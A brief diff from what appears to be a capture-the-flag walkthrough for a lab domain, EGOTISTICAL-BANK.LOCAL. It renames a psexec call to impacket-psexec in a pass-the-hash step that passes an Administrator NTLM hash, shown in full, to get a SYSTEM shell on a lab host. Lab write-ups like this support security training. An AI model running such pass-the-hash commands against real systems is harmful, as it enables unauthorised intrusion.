@@ -128,7 +128,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f
 Pass-the-hash to SYSTEM:
 
 ```bash
-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.93.188 \
+impacket-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.93.188 \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'
 ```
 
